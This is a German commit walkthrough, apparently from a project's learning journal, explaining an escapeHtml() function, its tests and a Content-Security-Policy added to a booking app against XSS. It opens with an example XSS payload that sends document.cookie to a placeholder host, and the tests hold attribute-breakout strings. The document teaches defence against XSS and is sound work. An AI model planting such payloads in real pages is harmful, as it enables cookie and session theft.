[← Vorheriger Commit](017_2026-09-30_booking-error-handling-ui-flow.md) · [↑ Branch-Übersicht](../008_2026-09-09_verbindung-ui-zu-datenbank.md) · [📓 Index](../000_index.md)

# feat(security): implement escapeHtml function to prevent XSS vulnerabilities and update relevant views

- **Commit:** `076c88f`
- **Datum:** 2026-10-07
- **Autor:** Oliver Jung

## Worum geht es?

Review-Punkt **A3**: _„Werte aus der Datenbank landen ungeschützt in `innerHTML` (XSS)."_

Das ganze Projekt baut sein HTML als **Template-String** und setzt es per `innerHTML` ein. Das ist bequem – aber jeder Wert, der in so einen String eingesetzt wird, wird vom Browser als **HTML** gelesen, nicht als Text. Steht in der Datenbank als Zimmername zum Beispiel

```text
Suite <img src=x onerror="fetch('https://boese.example/?c='+document.cookie)">
```

dann führt der Browser beim Anzeigen der Zimmerkarte dieses Skript aus. Das nennt man **Cross-Site-Scripting (XSS)**. Woher kommt so ein Wert? Aus einem gekaperten Admin-Konto, einer fehlerhaften Migration, einer URL, die jemand verschickt. Die View kann das nicht wissen – also darf sie keinem Wert von außen trauen.

Der Commit baut **zwei Schutzschichten**:

1. **Escapen** aller Werte von außen mit einer neuen Funktion `escapeHtml()`.
2. Eine **Content-Security-Policy** (CSP), die eingeschleuste Skripte auch dann blockiert, wenn das Escapen irgendwo vergessen wurde.

```text
 CLAUDE.md                                          | 15 +++-
 .../2026-09-30_verbindung-ui-zu-datenbank.md       |  4 +-
 src/index.html                                     | 11 +++
 src/shared/ui/html.spec.ts                         | 20 ++++++
 src/shared/ui/html.ts                              | 20 ++++++
 src/shared/ui/modal.ts                             |  2 +-
 src/views/BookingView/Booking.ts                   | 84 +++++++++++-----------
 src/views/PostsView/Posts.ts                       |  5 +-
 src/views/PostsView/SinglePostView/SinglePost.ts   |  5 +-
 9 files changed, 117 insertions(+), 49 deletions(-)
```

## Die Änderungen im Detail

### 1. `src/shared/ui/html.ts` – die Funktion `escapeHtml()`

```ts
/**
 * Schutz gegen XSS in den String-Templates.
 *
 * Alles, was nicht im Quelltext steht – Datenbank, URL, Eingaben, Fehlermeldungen –, geht
 * nur über `escapeHtml()` in ein Template. Das gilt für Text wie für Attributwerte
 * (immer in doppelten Anführungszeichen). Eingaben des Gastes setzen wir weiterhin
 * per `textContent`; das braucht keinen Escape.
 */

const HTML_ESCAPES: Readonly<Record<string, string>> = {
    '&': '&amp;',
    '<': '&lt;',
    '>': '&gt;',
    '"': '&quot;',
    "'": '&#39;',
};

export function escapeHtml(value: string): string {
    return value.replace(/[&<>"']/g, (char: string): string => HTML_ESCAPES[char] ?? char);
}
```

Fünf Zeichen haben in HTML eine Sonderbedeutung. Jedes wird durch seine **Entity** ersetzt, die der Browser zwar als das Zeichen anzeigt, aber nicht als Markup interpretiert:

| Zeichen | Entity   | Warum gefährlich                                       |
| ------- | -------- | ------------------------------------------------------ |
| `<` `>` | `&lt;` `&gt;` | öffnen/schließen Tags (`<script>`, `<img …>`)      |
| `"` `'` | `&quot;` `&#39;` | beenden einen Attributwert und erlauben neue Attribute wie `onerror=…` |
| `&`     | `&amp;`  | leitet selbst eine Entity ein                          |

Die Regex `/[&<>"']/g` findet alle fünf Zeichen in **einem** Durchlauf. Das ist wichtig: Würde man nacheinander mit fünf `replace`-Aufrufen arbeiten und `&` nicht zuerst behandeln, würde aus `<` erst `&lt;` und dann `&amp;lt;`. Der zugehörige Test prüft genau das:

```ts
it('escapt & zuerst nicht doppelt', () => {
    expect(escapeHtml('Bad & Sauna &amp;')).toBe('Bad &amp; Sauna &amp;amp;');
});
```

`?? char` ist hier nur für TypeScript nötig: Wegen `noUncheckedIndexedAccess` ist `HTML_ESCAPES[char]` vom Typ `string | undefined`, obwohl die Regex nur Schlüssel findet, die es gibt.

### 2. Die Tests: `html.spec.ts`

```ts
describe('escapeHtml', () => {
    it('entschärft Tags', () => {
        expect(escapeHtml('<img src=x onerror="alert(1)">')).toBe('&lt;img src=x onerror=&quot;alert(1)&quot;&gt;');
    });

    it('verhindert das Ausbrechen aus einem Attribut', () => {
        expect(escapeHtml(`" onmouseover='x'`)).toBe('&quot; onmouseover=&#39;x&#39;');
    });

    it('escapt & zuerst nicht doppelt', () => { /* … */ });

    it('lässt normalen Text unverändert', () => {
        expect(escapeHtml('Doppelzimmer „Seeblick“ – 2 Nächte')).toBe('Doppelzimmer „Seeblick“ – 2 Nächte');
    });
});
```

Der zweite Test zeigt, warum auch **Attributwerte** escapt werden müssen. In `<p title="${wert}">` würde der Wert `" onmouseover='x'` das Attribut schließen und ein neues anhängen. Und der letzte Test sichert ab, dass deutsche Anführungszeichen und Gedankenstriche durchkommen – sie sind keine HTML-Sonderzeichen.

### 3. Anwendung in `Booking.ts` – überall, wo Werte von außen landen

Der größte Teil des Diffs ist mechanisch: Jeder Wert aus Datenbank oder Laufzeit bekommt ein `escapeHtml(…)`. Ein paar typische Stellen:

```diff
-        const description = room.description === null ? '' : /*html*/ `<p class="…">${room.description}</p>`;
+        const description = room.description === null ? '' : /*html*/ `<p class="…">${escapeHtml(room.description)}</p>`;
```

```diff
-                : /*html*/ `<img src="${room.imageUrl}" alt="${room.imageAlt}" loading="lazy" class="…" />`;
+                : /*html*/ `<img src="${escapeHtml(room.imageUrl)}" alt="${escapeHtml(room.imageAlt)}" loading="lazy" class="…" />`;
```

```diff
-                        data-summary-id="${line.id}"
-                        aria-label="${line.name} entfernen"
+                        data-summary-id="${escapeHtml(line.id)}"
+                        aria-label="${escapeHtml(`${line.name} entfernen`)}"
```

Beim `aria-label` sieht man eine Regel: Escapt wird der **fertig zusammengesetzte** Text, denn der enthält ja den Zimmernamen aus der Datenbank.

Auch IDs und Codes werden escapt (`data-room-card`, `data-service-row` …), obwohl es UUIDs oder Großbuchstaben-Codes sind. Das wirkt übervorsichtig, folgt aber einer bewussten Regel aus `CLAUDE.md`: **Jeder Wert, der nicht wörtlich im Quelltext steht**, geht durch `escapeHtml()`. Eine Regel ohne Ausnahmen muss man beim Review nicht im Einzelfall durchdenken.

### 4. Markup und Text sauber trennen

Schwieriger wird es, wo eine Funktion **beides** bekommt – Text und fertiges HTML. Zwei Beispiele:

**Mehrzeilige Werte.** Die Hoteladresse wurde als Liste von Zeilen mit `<br>` verbunden. Escapt man erst danach, wird auch das `<br>` zu `&lt;br&gt;`. Also: erst jede Zeile escapen, dann verbinden.

```diff
-                <address class="…">${lines.join('<br>')}</address>
+                <address class="…">${lines.map(escapeHtml).join('<br>')}</address>
```

**Das Bestätigungs-Popup.** `getConfirmationRowHtml` bekam vorher einen fertigen String mit `<br>` darin. Jetzt bekommt sie eine **Liste** und kümmert sich selbst um Escapen und Verbinden:

```diff
-                        ${this.getConfirmationRowHtml('Zeitraum', `${stay}<br>${formatNights(created.nights)}`)}
+                        ${this.getConfirmationRowHtml('Zeitraum', [stay, formatNights(created.nights)])}
```

```diff
-    /** Werte kommen aus `create_booking` bzw. sind formatierte Zahlen – keine Eingaben des Gastes. */
-    private getConfirmationRowHtml(label: string, value: string): string {
+    /** Eine Zeile je Wert – escapt, weil Buchungsnummer und Währung aus der Datenbank kommen. */
+    private getConfirmationRowHtml(label: string, values: readonly string[]): string {
         return /*html*/ `
             <div class="flex items-start justify-between gap-4">
-                <dt>${label}</dt>
-                <dd class="text-right font-lato font-bold tracking-wide">${value}</dd>
+                <dt>${escapeHtml(label)}</dt>
+                <dd class="text-right font-lato font-bold tracking-wide">${values.map(escapeHtml).join('<br>')}</dd>
             </div>
         `;
     }
```

Interessant ist der alte Kommentar: _„keine Eingaben des Gastes"_. Das stimmte – aber die Buchungsnummer kommt aus der **Datenbank**, und auch die ist „von außen". Der neue Kommentar nennt den richtigen Grund.

**Funktionen, die Markup entgegennehmen**, escapen ihre Text-Parameter selbst und lassen den Markup-Parameter in Ruhe:

```ts
/** `control` ist fertiges Markup; alle anderen Werte sind Text und werden hier escapt. */
private getServiceRowShellHtml(code: string, inputId: string, name: string, description: string | null, label: string, control: string, selected: boolean): string {
```

Und `openModal()` bekommt einen deutlichen Hinweis im Typ:

```diff
-    /** Inhalt des Popups als HTML-String. */
+    /** Inhalt des Popups als HTML-String – wird ungeprüft eingesetzt, Werte von außen also vorher mit `escapeHtml()` behandeln. */
     html: string;
```

### 5. URLs: erst `encodeURIComponent`, dann `escapeHtml`

In der (älteren) Beitragsliste steckt eine ID in einem Link:

```diff
-                                <a href="/posts/${post.id}" data-link class="text-blue-500 hover:underline">
-                                    ${post.title}
+                                <a href="/posts/${escapeHtml(encodeURIComponent(post.id))}" data-link class="text-blue-500 hover:underline">
+                                    ${escapeHtml(post.title)}
                                 </a>
```

Zwei Funktionen, zwei Aufgaben – von innen nach außen gelesen:

1. `encodeURIComponent` sorgt dafür, dass die ID ein gültiges **URL-Segment** ist (`/` wird zu `%2F`, ein Leerzeichen zu `%20`). Sonst könnte eine ID wie `../admin` den Pfad verändern.
2. `escapeHtml` sorgt dafür, dass das Ergebnis im **HTML-Attribut** keinen Schaden anrichtet.

`SinglePost.ts` bekommt dasselbe für Titel und Beschreibung.

### 6. Zweite Verteidigungslinie: Content-Security-Policy in `index.html`

```html
<!--
    Zweite Verteidigungslinie gegen XSS: Selbst wenn ein Wert unescapt im HTML landet,
    führt der Browser keine Inline-Skripte und keine on*-Handler aus. Erlaubt sind nur
    Skripte vom eigenen Origin und Anfragen an Supabase (die URL setzt Vite
    aus der .env ein). `'unsafe-inline'` bei Styles braucht der Vite-Dev-Server und die
    `style`-Attribute der Header-Hintergründe.
-->
<meta
    http-equiv="Content-Security-Policy"
    content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data: %VITE_SUPABASE_URL%; font-src 'self' data:; connect-src 'self' %VITE_SUPABASE_URL%; object-src 'none'; base-uri 'self'; form-action 'self'"
/>
```

Eine CSP ist eine **Positivliste** für den Browser: Was nicht erlaubt ist, wird blockiert. Die wichtigsten Direktiven:

| Direktive                                 | Bedeutung                                                                  |
| ----------------------------------------- | -------------------------------------------------------------------------- |
| `script-src 'self'`                       | nur Skriptdateien vom eigenen Server – **kein** Inline-Skript, **kein** `onerror="…"` |
| `connect-src 'self' %VITE_SUPABASE_URL%`  | `fetch` nur zum eigenen Server und zu Supabase – Daten können nicht woandershin abfließen |
| `img-src 'self' data: %VITE_SUPABASE_URL%`| Bilder nur lokal, als `data:`-URL oder aus dem Supabase-Storage           |
| `object-src 'none'`, `base-uri 'self'`    | keine Plugins, kein Umbiegen relativer URLs per `<base>`                   |

`%VITE_SUPABASE_URL%` ist ein Platzhalter, den **Vite** beim Bauen und beim Start des Dev-Servers durch den Wert aus der `.env` ersetzt. So steht die Supabase-Adresse nur an einer Stelle.

Mit der CSP hätte das Beispiel vom Anfang selbst ohne Escapen keine Wirkung: `onerror="…"` ist ein Inline-Handler und wird blockiert, und selbst ein Skript könnte die Cookies nicht an `boese.example` schicken. Die Kehrseite: Inline-Handler im **eigenen** Markup funktionieren auch nicht mehr. Event-Listener müssen – wie im Projekt ohnehin üblich – in `afterRender()` per `addEventListener` gebunden werden.

### 7. `CLAUDE.md` – die Regel wird Projektwissen

Der Commit ergänzt `CLAUDE.md` um einen Abschnitt „Sicherheit (XSS)" und eine Code-Konvention:

```markdown
- Werte von außen in HTML-Templates nur über `escapeHtml()` – kein Linter prüft das, es ist Review-Pflicht (Details unter „Sicherheit (XSS)").
```

Der Halbsatz _„kein Linter prüft das"_ ist ehrlich und wichtig: Es gibt keine automatische Kontrolle. Die Regel lebt nur, wenn sie aufgeschrieben ist und im Review geprüft wird.

Außerdem wird bei der Gelegenheit der veraltete Supabase-Abschnitt korrigiert (Review-Punkt **D9**): Er behauptete noch, es gäbe keine Service-Schicht und der Client lese die `.env` nicht.

## Was wurde erreicht?

Die Buchungsseite und die Beitragsseiten setzen keinen Wert von außen mehr ungeprüft ins HTML. Und wo das doch einmal passiert, verhindert die CSP, dass daraus ausführbarer Code wird. Abgehakt im Review: **A3** und **D9**.

| Technik                                     | Wozu                                                               |
| ------------------------------------------- | ------------------------------------------------------------------ |
| `escapeHtml()` mit einer Regex              | alle fünf HTML-Sonderzeichen in einem Durchlauf, kein Doppel-Escape |
| Escapen erst an der Ausgabe                 | Daten bleiben unverändert, nur die Darstellung wird geschützt      |
| Listen statt `<br>`-Strings übergeben       | Text und Markup bleiben getrennt                                   |
| `encodeURIComponent` + `escapeHtml`         | erst gültige URL, dann sicheres Attribut                           |
| Content-Security-Policy                     | zweite Schutzschicht, falls das Escapen vergessen wird             |
| Regel in `CLAUDE.md`                        | eine Konvention, die kein Werkzeug prüft, muss aufgeschrieben sein |

---

[📓 Index](../000_index.md) · [↑ Branch-Übersicht](../008_2026-09-09_verbindung-ui-zu-datenbank.md) · [Nächster Commit →](019_2026-10-07_booking-logic-cleanup-service-reconciliation.md)
